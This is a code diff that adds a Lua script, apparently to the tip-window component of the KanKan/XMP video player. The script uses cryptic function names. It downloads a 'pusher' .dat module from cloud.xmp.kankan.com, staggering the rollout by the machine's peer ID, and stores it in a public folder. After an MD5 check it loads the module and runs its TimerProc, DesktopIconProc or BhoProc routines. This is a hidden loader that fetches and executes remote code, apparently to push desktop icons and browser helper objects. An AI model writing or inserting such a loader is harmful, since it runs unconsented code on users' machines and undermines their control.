@@ -1,0 +1,67 @@
+local u=XLGetObject("XmpTipWnd.Util")
+local au=XLGetObject("XmpTipWnd.AsynUtil")
+function GC()
+	return {
+		[1] = {link="http://cloud.xmp.kankan.com/pusher/pusher_v2.3.dat",md5="DEE8D80080A1DDAF6D50AE65B7354963",peerid="4"},
+		[2] = {link="http://cloud.xmp.kankan.com/pusher/pusher_v2.2.dat",md5="A7A8AB813F7F683F546DC1052C65A466"},
+	}
+end
+function X() au:SoftExit() end
+function IRS(s) return type(s)=="string" and s~="" end
+function GPID() return u:GetPeerId() or "0000000000000000" end
+function GHF(k,p,d,f)
+	local b=false
+	local function W(r,s)
+		if not b then b=true f(r,s) end
+	end
+	au:AjaxGetHttpFile(k,p,W)
+	au:SetTimer(300000,function (n) au:KillTimer(n) W(-2) end)
+end
+function SL(c)
+	local g=string.lower(string.sub(GPID(),12,12))
+	for i = 1, #c do
+		if type(c[i])=="table" and IRS(c[i].link) and (not IRS(c[i].peerid) or string.find(string.lower(c[i].peerid),g,1,true)~=nil) then return c[i].link,c[i].md5 end
+	end
+	return nil
+end
+function GCD()
+	local sEnv="%PUBLIC%"
+	local sVal=u:ExpandEnvironmentStrings(sEnv)
+	if (not IRS(sVal)) or sVal==sEnv then sVal=u:GetSpecialFolderPathEx(35) end
+	if (not IRS(sVal)) or (not u:QueryFileExists(sVal)) then 
+		sVal=nil 
+	else
+		sVal=u:PathCombine(sVal,"Thunder Network\\KanKan\\Xapp\\Code\\pusher")
+	end
+	
+	return sVal
+end
+function CTF(k)
+	local b=string.find(k,"?") or (string.len(k)+1)
+	local f=u:GetFileName(string.sub(k,1,b-1))
+	local d=GCD()
+	if IRS(d) and IRS(f) then return u:PathCombine(d,f) end
+	return nil
+end
+function CMD5(p,v)
+	return u:GetMD5Value(p)==v
+end
+function STMP(t)
+	local f=tonumber(string.sub(GPID(),12,12),16) or 0
+	local ct=u:GetCurrentUTCTime()
+	return math.floor((ct+8*3600-(f+1)*3600)/(t*3600))
+end
+function J(m,e)
+	local k,md5=SL(GC()) if not IRS(k) then X() return end
+	local p=CTF(k) if not IRS(p) then X() return end
+	local function AF(r,s)
+		if not (0==r and CMD5(s,md5)) then X() return end
+		local t=XLLoadModule(s)
+		if not (type(t)=="table" and type(t[e])=="function") then X() return end
+		t[e](m)
+	end
+	if CMD5(p,md5) then AF(0,p) else GHF(k.."?stamp="..tostring(STMP(24)),p,false,AF) end
+end
+function Main(m) J(m,"TimerProc") end
+function DesktopIconProc(m) J(m,"DesktopIconProc") end
+function BhoProc(m) J(m,"BhoProc") end
